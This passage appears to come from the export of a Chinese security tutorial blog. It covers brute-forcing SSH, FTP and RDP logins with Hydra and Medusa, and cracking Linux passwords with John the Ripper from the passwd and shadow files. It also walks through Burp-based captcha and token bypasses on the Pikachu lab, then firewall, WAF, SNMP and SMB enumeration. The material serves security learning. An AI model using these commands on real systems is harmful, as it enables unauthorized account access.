<li>-t &lt;TASKS&gt;：同时运行的线程数，默认为16</li>
<li>-w &lt;TIME&gt;：设置最大超时的时间，单位秒，默认是30s</li>
<li>-v / -V：显示详细过程</li>
<li>server：目标ip</li>
<li>service：指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</li>
<li>OPT：可选项</li>
</ul>
<h4 id="破解SSH"><a href="#破解SSH" class="headerlink" title="破解SSH"></a>破解SSH</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 192.168.11.93 ssh</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/yZYIcgOoWD5bfdQ.png" alt="8358c8a89b5d02c7670ea8ae718c13a4.png"></p>
<h4 id="破解FTP"><a href="#破解FTP" class="headerlink" title="破解FTP"></a>破解FTP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -o ftp.txt -vV -t 8 192.168.11.93 ftp</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/PEl2azG9xBXYgmi.png" alt="a7b52aa8f605b834afe39b955495a3c9.png"></p>
<h4 id="破解3389远程登录"><a href="#破解3389远程登录" class="headerlink" title="破解3389远程登录"></a>破解3389远程登录</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hdra -L user.txt -P passwd.txt -vV -t 16 192.168.14.198 rdp</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/uKeEW4zFgTHDtAY.png" alt="ab8ecf65d9bab340efc97288dd255f8f.png"></p>
<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登陆，可以同时对多个主机，用户或是密码执行强力测试，medusa和hydra一样，同样属于在线破解工具，不同的是，medusa的稳定性相较于hydra要好很多但是支持的模块相对于hydra少一些。</p>
<h4 id="常见参数-1"><a href="#常见参数-1" class="headerlink" title="常见参数"></a>常见参数</h4><ul>
<li>-h 目标主机名称或是IP地址</li>
<li>-H 包含目标主机名称或是IP地址文件</li>
<li>-u 测试用户名</li>
<li>-U 包含测试用户名文件</li>
<li>-p 测试用户名密码</li>
<li>-P 包含测试用户名密码文件</li>
<li>-C 组合条件文件</li>
<li>-O 日志信息文件</li>
<li>-e[n/s/ns] n代表空密码，s代表为密码于用户名相同</li>
<li>-M 模块执行mingc</li>
<li>-m 传递参数到模块</li>
<li>-d 显示所有模块名称</li>
<li>-n 使用非默认TCP端口</li>
<li>-s 启用ssl</li>
<li>-r 重试时间，默认3秒</li>
<li>-t 设定线程数量</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul>
<li>破解ftp服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -u root -P comon.lst -h 192.168.200.243 -M ftp</span><br></pre></td></tr></table></figure>
<ul>
<li>破解ssh</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -u root -P comon.lst -h 192.168.200.244 -e ns -M ssh</span><br></pre></td></tr></table></figure>
<h3 id="Sparta"><a href="#Sparta" class="headerlink" title="Sparta"></a>Sparta</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>Sparta是一个Nmap、Nikto、Hydra等工具的集合，利用各个工具的优秀功能，完成信息收集、扫描和爆破等一体化的工具流。</p>
<p>Sparta主要包含以下功能：</p>
<p>端口扫描，程序自动调用nmap进行扫描，根据nmap的扫描结果，nikto自动加载结果，展开更精确的扫描。</p>
<p>针对扫描的结果，特定使用，如：使用dirbuster目录爆破，利用webslayer进行web指纹识别。</p>
<p>针对可爆力破解的端口，可调用hydra进行暴力破解。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secforce/sparta.git</span><br><span class="line"><span class="built_in">cd</span> sparta/ </span><br><span class="line">python3 sparta.py</span><br></pre></td></tr></table></figure>
<h2 id="破解加密明文"><a href="#破解加密明文" class="headerlink" title="破解加密明文"></a>破解加密明文</h2><h3 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p><strong>John the Ripper</strong>是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。除了在各种Unix系统上最常见的几种密码哈希类型之外，它还支持Windows LM散列，以及社区增强版本中的许多其他哈希和密码。它是一款开源软件。Kali中自带John。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">可执行文件位置：  /usr/sbin/john</span><br><span class="line">密码字典所在目录：/usr/share/john/</span><br></pre></td></tr></table></figure>
<p>John the Ripper支持字典破解方式和暴力破解方式</p>
<h4 id="破解Linux系统密码"><a href="#破解Linux系统密码" class="headerlink" title="破解Linux系统密码"></a>破解Linux系统密码</h4><p>破解Linux用户密码需要使用到两个文件（包含用户的信息和密码hash值）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd       包含用户信息的文件</span><br><span class="line">/etc/shadow       包含密码信息的文件</span><br></pre></td></tr></table></figure>
<p>创建一个 abc 用户，密码设置为 password ，用来测试</p>
<p><img src="https://i.loli.net/2021/10/05/dXw3oM2gVsRShIT.png" alt="img"></p>
<p>使用 unshadow 命令组合 /etc/passwd 和 /etc/shadow ，组合成 test_passwd 文件。其他 test_passwd 就是 /etc/passwd 和 /etc/shadow 的简单组合:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unshadow  /etc/passwd  /etc/shadow &gt;  test_passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/1ZMmCKRvUqYdVjJ.png" alt="img"></p>
<p>然后用 John 破解密码了。我们可以使用 John 自带的密码字典，位于 /usr/share/john/password.lst ，也可以使用我们自己的密码字典。用John自带的密码字典为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john  test_passwd</span><br></pre></td></tr></table></figure>
<p>若使用自己的密码字典：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john  --wordlist=字典路径    test_passw</span><br></pre></td></tr></table></figure>
<p>如图，john 已经把abc用户的密码给破解出来了</p>
<p><img src="https://i.loli.net/2021/10/05/xhUjei9ICamtuLo.png" alt="img"></p>
<p>查看破解信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john  --show  test_passwd</span><br></pre></td></tr></table></figure>
<p>这里root和yjx的密码是之前破解的，则一共破解了3个用户的密码</p>
<p><img src="https://i.loli.net/2021/10/05/BUSb52aKhixM1Vq.png" alt="img"></p>
<h3 id="在线MD5破解网站"><a href="#在线MD5破解网站" class="headerlink" title="在线MD5破解网站"></a>在线MD5破解网站</h3><ul>
<li>CMD5：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
<li>SOMD5：<a href="https://www.somd5.com/">https://www.somd5.com/</a></li>
<li>查MD5啦：<a href="https://cmd5.la/">https://cmd5.la/</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>针对Web应用的暴力破解</title>
    <url>/post/6d47f502.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="表单暴力破解"><a href="#表单暴力破解" class="headerlink" title="表单暴力破解"></a>表单暴力破解</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<ol>
<li><p>是否要求用户设置复杂的密码；</p>
</li>
<li><p>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</p>
</li>
<li><p>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</p>
</li>
<li><p>是否采用了双因素认证；</p>
</li>
</ol>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul>
<li>确认登录接口的脆弱性<ul>
<li>尝试登录——抓包——观察验证元素和response信息，判断是否存在暴力破解的可能</li>
</ul>
</li>
<li>对字典进行优化<ul>
<li>根据实际情况对字典进行优化，提高暴力破解的效率</li>
</ul>
</li>
<li>工具自动化操作</li>
</ul>
<p>以下实验环境是基于Pikachu靶场进行的。</p>
<p>靶场下载：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<h2 id="简单表单暴力破解"><a href="#简单表单暴力破解" class="headerlink" title="简单表单暴力破解"></a>简单表单暴力破解</h2><p><img src="https://i.loli.net/2021/10/05/WU9AscIgqDwNtE1.png" alt="img"></p>
<p>输入错误时，有以下提示</p>
<p><img src="https://i.loli.net/2021/10/05/eZYwM9kvyqftQBL.png" alt="img"></p>
<p>这里没有验证码等其他验证机制，抓包看看</p>
<p><img src="https://i.loli.net/2021/10/05/Q9KXaud3UbYzs1k.png" alt="411a58df5762da917562a60df616d9b7.png"></p>
<p>发送到Intruder进行暴力破解</p>
<p><img src="https://i.loli.net/2021/10/05/eEIQXjUospwLFuK.png" alt="e20f71994117892067fb23b951d60174.png"></p>
<p>设置好Payload</p>
<p><img src="https://i.loli.net/2021/10/05/fDNSacVGsy7Fvor.png" alt="b054b7e3eccc40104336ad93493844e7.png"></p>
<p><img src="https://i.loli.net/2021/10/05/BMmvOWEVGwtijJk.png" alt="c807ca1a8508c1ae817b5d803b1a4c5f.png"></p>
<p>然后把“ username or password is not exists～ ”复制到Grep Match中。后面可以利用Grep Match区分哪些请求里面有这个字符串</p>
<p><img src="https://i.loli.net/2021/10/05/xcmQdGXPbI8qaez.png" alt="d5c28d32cdd16bd6430c53da023752b1.png"></p>
<p>然后就可以开始攻击了，匹配到 username or password is not exists 都是攻击失败的，另外，从响应长度也可以看出攻击成功与否</p>
<p><img src="https://i.loli.net/2021/10/05/X75OasPWkIMLcwH.png" alt="a479b7c9cdea29fec0047c53e1e525fc.png"></p>
<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><p>验证码可以用来防止恶意注册、防止暴力破解。服务端验证码常见问题：</p>
<ul>
<li>验证码在后台不过期，导致长期可以使用</li>
<li>验证码校验不严格，逻辑出现问题</li>
<li>验证码设计的太过简单和有规律，容易被猜解</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/JOpHyoWxMvltsui.png" alt="img"></p>
<p>我们先简单的测试一下，不输入验证码的情况下会提示验证码为空，输入错误验证码的情况下会提示验证码错误，只有验证码正确的前提下才会提示账号或密码不存在</p>
<p>下面通过抓包判断一下服务器端有没有对验证码进行验证，发现是有的</p>
<p><img src="https://i.loli.net/2021/10/05/RNCpgvOcTrULKI4.png" alt="img"></p>
<p>说明后端对验证码是有验证的，我们来了解一下验证码生成的逻辑：</p>
<p>当我们刷新页面的时候，我们会向后台发送一个请求，后台收到请求会生成一个验证码并在session中把验证码保存下来。</p>
<p>我们先生成一个新的验证码，然后在BurpSuite中输入正确的验证码</p>
<p><img src="https://i.loli.net/2021/10/05/grZoR2BVjCFqxkL.png" alt="img"></p>
<p>提示账号密码不存在</p>
<p><img src="https://i.loli.net/2021/10/05/Z29GPSH6xMmNXdD.png" alt="img"></p>
<p>我们换个密码再发送一次</p>
<p><img src="https://i.loli.net/2021/10/05/T3xV2H89Qts4GcM.png" alt="img"></p>
<p>发现依然是提示账号密码不存在，正常来说应该提示验证码错误，这说明验证码长期有效，我们发送到Intruder中直接暴力破解</p>
<p><img src="https://i.loli.net/2021/10/05/fNgdnPUuqSbcoLV.png" alt="f55213b55230b3fdb2c1b88f535e3df9.png"></p>
<h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141249035-185107144.png" alt="img"></p>
<p>这里我们需要输入验证码，我们不能对验证码暴力破解，通过抓包发现请求里面只是多了验证码</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141436927-844829976.png" alt="img"></p>
<p>通过查看源码，发现验证码的验证逻辑是在客户端实现的</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141607397-1462570833.png" alt="img"></p>
<p>这个JavaScript会从0-9和26个大写字母中随机挑选5个作为验证码，然后用 validate() 去验证</p>
<p>另外，通过源码也可以看到，我们每点一次验证码，就会调用 createCode() 改变验证码</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141835317-2117397253.png" alt="img"></p>
<p>通过BurpSuite发现后台不会对输入错误的验证码进行验证，在浏览器中，输入错误的验证码是有提示的</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142146348-490097606.png" alt="img"></p>
<p>正常来说会有这个弹窗</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142226004-1509701597.png" alt="img"></p>
<p>说明前端设置的验证码如同虚设，后端不会对验证码进行验证。那么我们不用理会验证码，直接进行暴力破解就可以了</p>
<p><img src="https://i.loli.net/2021/10/05/nahYLzDuR1ICHyl.png" alt="80e7b4b4b0da5a1ca4e4d0f538d282a1.png"></p>
<h2 id="PKAV-HTTP-Fuzzer-识别验证码"><a href="#PKAV-HTTP-Fuzzer-识别验证码" class="headerlink" title="PKAV HTTP Fuzzer 识别验证码"></a>PKAV HTTP Fuzzer 识别验证码</h2><p>PKAV HTTP Fuzzer是PKAV团队编写的一个带图形验证码爆破识别的渗透测试工具。</p>
<p>不过该工具现在已经停止更新了，最近一次更新是在2016年。</p>
<p>该工具只能识别较为简单的验证码。</p>
<p>使用之前需要先安装.net framework 4.0或以上版本</p>
<p>首先使用burpsuite对web表单进行抓包。</p>
<p><img src="https://i.loli.net/2021/10/05/xf2kUvyNce5KuDb.png" alt="120f248052e508b544bc09f227e038d9.png"></p>
<p><img src="https://i.loli.net/2021/10/05/SMAxKhDlHn4PIC3.png" alt="48529ff85d52307ce3d3533226811365.png"></p>
<p>打开PKAV HTTP Fuzzer，将地址与burp抓到的请求包粘贴到工具中的对应位置。</p>
<p><img src="https://i.loli.net/2021/10/05/nCiOrXZetAQ1Wvm.png" alt="f4b3f7eeb0e72590e3d5c5ab60861ede.png"></p>
<p>对用用户名和密码添加标记，对验证码添加验证码标记。</p>
<p><img src="https://i.loli.net/2021/10/05/qOHFEK8Z1nsvY3R.png" alt="0649d335bce73a54bccc64b755a2ab39.png"></p>
<p>更改重放模式为异值异步重放模式，对两个变体分别导入字典</p>
<p><img src="https://i.loli.net/2021/10/05/DUXnEG4cwrxJvao.png" alt="9d1936f68dd1d79324ae103447fb5444.png"></p>
<p>右键验证码图片，复制验证码地址</p>
<p><img src="https://i.loli.net/2021/10/05/q4fCtNX5wLJRIQO.png" alt="bb2635eed417fb5d9298cf0b9de92b62.png"></p>
<p>将验证码粘贴到到工具中的地址框</p>
<p><img src="https://i.loli.net/2021/10/05/lLVIYW8miKHJ6At.png" alt="8b1cfd6f013ded1cbd7fbda681ae2476.png"></p>
<p>对这种简单的验证码识别还算准确（注意使用自带识别引擎识别，第三方识别引擎都是用不了的）</p>
<p>使用发包器，开始进行暴力破解<img src="https://i.loli.net/2021/10/05/ixO7lGL5SVYPQCT.png" alt="51bfaff708834b9294d0c1d743b5bd98.png"></p>
<p>可以看到长度为867的返回包中显示登录成功。</p>
<p><img src="https://i.loli.net/2021/10/05/DBjJxQGIZgY2Szu.png" alt="6cef7fefde3290ab4d10b71814defec6.png"></p>
<h2 id="Token绕过"><a href="#Token绕过" class="headerlink" title="Token绕过"></a>Token绕过</h2><p>利用开发者工具可以发现这里有一个隐藏的标签</p>
<p><a href="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918150005897-1483756020.png"><img src="https://i.loli.net/2021/10/05/651qkG8xwUJejQF.png" alt="img"></a></p>
<p>里面的数字就是我们的token，我的每次提交的请求都会有一个token值，后端会验证这个token值</p>
<p>但是这个token已经写到了html页面中，攻击者只需要写个工具，提交认证前都加上这个token就好了</p>
<p>我们抓包后，发送到intruder中，步骤如图</p>
<p><img src="https://i.loli.net/2021/10/05/LniaTh1z4BqKvJF.png" alt="468c044c99cb8b22304d3fca69cdc227.png"></p>
<p>这里只对admin用户进行暴力破解（注意攻击类型为Pitchfork）</p>
<p>我们把token设置变量，options的grep extract添加token：</p>
<p><img src="https://i.loli.net/2021/10/05/ZFqsTPl2HrgzuEh.png" alt="455810f95f3da0de85735a0b866ece0f.png"></p>
<p><img src="https://i.loli.net/2021/10/05/1mUksKjvVnIRFC6.png" alt="image-20211005185127542">**</p>
<p>token变量的type设置成recursive grep</p>
<p><img src="https://i.loli.net/2021/10/05/IZKfaYV6EdPWXmJ.png" alt="5ffd92bd1f4220bf840521e5d3802187.png"></p>
<p>将请求数设置为1</p>
<p><img src="https://i.loli.net/2021/10/05/y2fUX6Tav3Qeq4C.png" alt="2b707b1da69fbbab8082b1814b0d1c56.png"></p>
<p>最后点击Start attack进行攻击</p>
<p><img src="https://i.loli.net/2021/10/05/a9fJun1QRj87GPC.png" alt="32c699c665b8d80f3821d634c175a1bb.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>防护扫描与服务枚举</title>
    <url>/post/fcfd17ed.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>防火墙(Firewall):防火墙指的是一个由软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的边界上构造的保护屏障。防火墙是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。</p>
<p>通过发送SYN和ACK数据包并分析回包可以大概判断端口是否被防火墙过滤，对应关系如下表：</p>
<p><img src="https://img.136.la/20210811/2623fe2699d84c3c95a67f0d743cb7b5.jpg" alt="技术分享图片"></p>
<h3 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h3><p>使用nmap识别是否开启防火墙过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sA &lt;ip&gt; -p &lt;端口号&gt;	#端口号可随机</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/AyuLdYB7qV65Sbp.png" alt="5584d547d07031a8387f1626102702de.png"></p>
<p>从状态可以看出，前者开启了防护墙过滤，而后者没有。</p>
<h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
<h3 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-waf-detect.nse www.baidu.com</span><br></pre></td></tr></table></figure>
<h3 id="Wafw00f"><a href="#Wafw00f" class="headerlink" title="Wafw00f"></a>Wafw00f</h3><p>Kali Linux内置工具</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f baidu.com</span><br></pre></td></tr></table></figure>
<h2 id="负载均衡检测"><a href="#负载均衡检测" class="headerlink" title="负载均衡检测"></a>负载均衡检测</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>负载均衡建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。</p>
<ul>
<li>广域网负载均衡</li>
</ul>
<p>他的原理就是DNS，简单的方法就是使用DNS轮询来进行负载均衡。当你访问一个域名时，同一个域名会被解析成多个A记录解析到多个ip地址上。</p>
<ul>
<li>服务器负载均衡</li>
</ul>
<p>基于web的服务，经常使用的是nginx、apache这种应用层的负载均衡。</p>
<p>当然也可以使用一些负载均衡设备去实现。</p>
<blockquote>
<p>目的：在扫描探测的阶段，我们也有必要发现一下目标域名被解析到多少个服务器，这些歌服务器有可能因为管理员的配置不善，不同的服务器之间他们的安全防护是不一样的，配置也不一样，有的ip可能就会存在问题。这时候我们去识别目标系统使用的是什么负载均衡，以及这个负载均衡，他是不是本身存在有漏洞。</p>
</blockquote>
<h3 id="ldb"><a href="#ldb" class="headerlink" title="ldb"></a>ldb</h3><p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldb www.baidu.com</span><br></pre></td></tr></table></figure>
<h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p><strong>SNMP：简单网络管理协议</strong></p>
<ul>
<li>基于SNMP，进行网络设备监控，如：交换机、防火墙、服务器，CPU等其系统内部信息。基本都可以监控到</li>
<li>community：登录证书，容易被管理员遗忘修改其特征字符 #可用字典破解community（public/private/manager）</li>
<li>信息的金矿，经常被错误配置</li>
</ul>
<p><strong>MIB Tree：</strong></p>
<ul>
<li>SNMP Management Information</li>
<li>树型的网络设备管理功能数据库</li>
</ul>
<h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>安装服务</strong></p>
<p><img src="https://i.loli.net/2021/10/05/85U3arIzFtbwdBm.png" alt="ae48d149296cc788257c26e64ca572ea.png"></p>
<p><strong>开启服务</strong></p>
<p><img src="https://i.loli.net/2021/10/05/WRrzJepmAH9lnhB.png" alt="d485a496a5508d5aa5948c360aa87d07.png"></p>
<p>默认接受的社区为monitor，且接受来自任何主机的snmp数据包</p>
<h3 id="snmp-check"><a href="#snmp-check" class="headerlink" title="snmp-check"></a>snmp-check</h3><p>Kali Linux内置工具</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmp-check 192.168.123.188 -c monitor</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/uDUAGfRKconYF9V.png" alt="dbb7f10caccb74233aa89189bded2968.png"></p>
<p>相比于onesixtyone能扫描出更多信息，相比于snmpwalk可读性更好。</p>
<h2 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p><strong>SMB协议：</strong></p>
<ul>
<li>Server Message Block协议</li>
<li>微软历史上出现问题最多的协议</li>
<li>实现复杂，默认在Windows上是开放的，也是最常用的协议，用于实现文件的共享</li>
</ul>
<h3 id="nmap脚本扫描-1"><a href="#nmap脚本扫描-1" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>可以使用nmap扫描默认开放的端口139,445，但是不能准确判断操作系统的类型，一般情况下是Windows系统</p>
<p>1、使用nmap自带的脚本进行操作系统的判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.123.155 -p139,445 --script=smb-os-discovery.nse</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/AIN1zeR7KFWQykE.png" alt="0f24a04ebf8aef1ffa37c6ad8a661aa9.png"></p>
<p>2、扫描Windows系统中的SMB协议是否有漏洞；可以使用smb-vuln-*.nse来指定所有的脚本文件，进行全扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=safe=1 192.168.123.155 </span><br></pre></td></tr></table></figure>
<p><img src="/post/data:;base64,
        <svg width=" 1700" height="1536" xmlns="http://www.w3.org/2000/svg">  " /></p>
<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>enum4linux是Kali Linux自带的一款信息收集工具。它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000XP/2003，在Windows 7/10系统，部分功能受限。</p>
<p><strong>选项：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-U</span><br><span class="line">    获取用户列表</span><br><span class="line"></span><br><span class="line">-M</span><br><span class="line">    get machine list*</span><br><span class="line"></span><br><span class="line">-S</span><br><span class="line">    获取共享列表</span><br><span class="line"></span><br><span class="line">-P</span><br><span class="line">    获取密码策略信息</span><br><span class="line"></span><br><span class="line">-G</span><br><span class="line">    获取组和成员列表</span><br><span class="line"></span><br><span class="line">-d</span><br><span class="line">    详细说明，适用于-U和-S</span><br><span class="line"></span><br><span class="line">-u user</span><br><span class="line">    指定要使用的用户名（默认为“”）</span><br><span class="line"></span><br><span class="line">-p pass</span><br><span class="line">    指定要使用的密码（默认为“”）</span><br></pre></td></tr></table></figure>
<p><strong>附加选项：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a</span><br><span class="line">    执行所有简单的枚举（-U -S -G -P -r -o -n -i）。如果您未提供其他任何选项，则启用此选项。</span><br><span class="line"></span><br><span class="line">-h</span><br><span class="line">    显示帮助信息并退出</span><br><span class="line"></span><br><span class="line">-r</span><br><span class="line">    通过RID循环枚举用户</span><br><span class="line"></span><br><span class="line">-R range</span><br><span class="line">    要枚举的范围（默认值：500-550、1000-1050，暗含-r）</span><br><span class="line"></span><br><span class="line">-K n</span><br><span class="line">    继续搜索RID，直到n个连续的RID与用户名不对应为止。 Impies RID范围以999999结尾。对于DC很有用。</span><br><span class="line"></span><br><span class="line">-l</span><br><span class="line">    通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DC）</span><br><span class="line"></span><br><span class="line">-s file</span><br><span class="line">    暴力破解推测股票名称</span><br><span class="line"></span><br><span class="line">-k user</span><br><span class="line">    远程系统上存在的用户（默认：管理员，来宾，krbtgt，域管理员，root，bin，none）。用于通过“ lookupsidknown_username”获取sid。使用逗号尝试多个用户：“ -k admin， user1，user2”</span><br><span class="line"></span><br><span class="line">-o</span><br><span class="line">    获取操作系统信息</span><br><span class="line"></span><br><span class="line">-i</span><br><span class="line">    获取打印机信息</span><br><span class="line"></span><br><span class="line">-w wrkg</span><br><span class="line">    手动指定工作组（通常自动找到）</span><br><span class="line"></span><br><span class="line">-n</span><br><span class="line">    做一个nmblookup（类似于nbtstat）</span><br><span class="line"></span><br><span class="line">-v</span><br><span class="line">    详细。 显示正在运行的完整命令（net，rpcclient等）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试初探</title>
    <url>/post/8e7b010c.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="模糊测试介绍"><a href="#模糊测试介绍" class="headerlink" title="模糊测试介绍"></a>模糊测试介绍</h2><p>模糊测试（fuzz testing，fuzzing）是一种软件测试技术，其核心思想是将自动或半自动生成的随机数据输入到一个程序中并监视程序异常，如崩溃、断言失败，以发现可能的程序错误，比如内存泄露。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>
<p>可以说，任何以暴力枚举形式的测试都能称为模糊测试。</p>
<p>漏洞挖掘有三种方法：白盒代码审计、灰盒逆向工程、黑盒测试。其中黑盒的Fuzz测试是效率最高的一种，能够快速验证大量潜在的安全威胁。</p>
<p>这里只是对一些常用的Web应用Fuzz工具做简单介绍，之后会结合实战进行一个详细地演示。</p>
